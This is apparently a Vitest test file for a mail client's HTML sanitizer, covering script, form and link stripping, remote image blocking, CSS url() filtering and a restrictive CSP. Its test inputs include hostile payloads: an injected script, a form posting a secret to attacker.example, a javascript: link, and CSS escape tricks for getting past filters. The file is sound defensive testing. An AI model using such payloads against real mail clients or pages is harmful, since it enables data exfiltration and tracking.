/** @vitest-environment jsdom */

import { describe, expect, it } from "vitest";
import {
  buildMailHtmlDocument,
  isMailHtmlBody,
  sanitizeMailHtml,
  sanitizeMailHtmlDetailed,
  sanitizeMailStyle
} from "../src/mail-content-security";

describe("sanitizeMailHtml", () => {
  it("blocks executable markup and remote tracking resources", () => {
    const sanitized = sanitizeMailHtml(`
      <script>window.pwned = true</script>
      <form action="https://attacker.example/collect"><input name="secret"></form>
      <img data-kind="remote" src="https://tracker.example/pixel.gif">
      <div data-kind="styled" style="color: red; background-image: url(https://tracker.example/bg.png)">hello</div>
    `);
    const template = document.createElement("template");
    template.innerHTML = sanitized;

    expect(template.content.querySelector("script, form, input")).toBeNull();
    expect(template.content.querySelector('[data-kind="remote"]')?.getAttribute("src")).toMatch(/^data:image\/svg/);
    expect(template.content.querySelector('[data-kind="styled"]')?.getAttribute("style")).toBe("color: red");
    expect(sanitized).not.toContain("tracker.example");
  });

  it("keeps embedded images and routes approved links through a new window", () => {
    const sanitized = sanitizeMailHtml(`
      <img data-kind="embedded" src="data:image/png;base64,AA==">
      <a data-kind="safe" href="https://example.com/message">open</a>
      <a data-kind="unsafe" href="javascript:alert(1)">bad</a>
    `);
    const template = document.createElement("template");
    template.innerHTML = sanitized;

    expect(template.content.querySelector('[data-kind="embedded"]')?.getAttribute("src")).toBe("data:image/png;base64,AA==");
    expect(template.content.querySelector('[data-kind="safe"]')?.getAttribute("target")).toBe("_blank");
    expect(template.content.querySelector('[data-kind="safe"]')?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(template.content.querySelector('[data-kind="unsafe"]')?.getAttribute("href")).toBeNull();
  });
});

describe("mail document policy", () => {
  it("removes CSS URL loads and embeds a restrictive document CSP", () => {
    expect(sanitizeMailStyle("font-weight: bold; background: url('https://tracker.example/a')")).toBe("font-weight: bold");
    // CSS 反转义后仍必须被拦下（纵深防御）。
    expect(sanitizeMailStyle("background: u\\72 l(https://tracker.example/x.png)")).toBe("");
    expect(sanitizeMailStyle("background: \\75rl(https://tracker.example/x.png)")).toBe("");
    expect(sanitizeMailStyle("color: red; -moz-binding: url(x)")).toBe("color: red");
    const documentHtml = buildMailHtmlDocument("<p>safe</p>");
    expect(documentHtml).toContain("default-src 'none'");
    expect(documentHtml).toContain("img-src data: cid:");
    expect(documentHtml).toContain('<meta name="referrer" content="no-referrer">');
  });

  it("uses the normalized content type instead of guessing from plaintext markup", () => {
    expect(isMailHtmlBody("text")).toBe(false);
    expect(isMailHtmlBody("HTML")).toBe(true);
    expect(isMailHtmlBody("text/html; charset=utf-8")).toBe(true);
  });
});

describe("remote images in message bodies", () => {
  it("blocks remote images without leaving the URL in the document", () => {
    const result = sanitizeMailHtmlDetailed(
      '<img data-kind="remote" src="https://tracker.example/pixel.gif"><p>hi</p>'
    );

    expect(result.blockedImages).toBe(1);
    const template = document.createElement("template");
    template.innerHTML = result.html;
    const image = template.content.querySelector('[data-kind="remote"]');
    // src 换成本地透明占位图：既不发请求，也不会渲染成 Chromium 的「破图」图标。
    expect(image?.getAttribute("src")).toMatch(/^data:image\/svg/);
    expect(image?.getAttribute("data-blocked-image")).toBe("1");
    // 正文 DOM 里不能出现任何远程地址，否则「点击显示图片」之外仍有泄漏面。
    expect(result.html).not.toContain("tracker.example");
  });

  it("loads remote images only when the user explicitly allows them", () => {
    const result = sanitizeMailHtmlDetailed(
      '<img data-kind="remote" src="https://cdn.example/logo.png">',
      { allowRemoteImages: true }
    );

    expect(result.blockedImages).toBe(0);
    expect(result.html).toContain("https://cdn.example/logo.png");
  });

  it("keeps the document CSP in sync with the allow-remote decision", () => {
    expect(buildMailHtmlDocument("<p>x</p>")).toContain("img-src data: cid:;");
    expect(buildMailHtmlDocument("<p>x</p>", { allowRemoteImages: true })).toContain("img-src data: cid: https: http:");
  });

  it("counts every blocked image so the reader can say how many it hid", () => {
    const result = sanitizeMailHtmlDetailed(
      '<img src="https://a.example/1.png"><img src="https://a.example/2.png"><img src="data:image/png;base64,AA==">'
    );

    expect(result.blockedImages).toBe(2);
  });
});
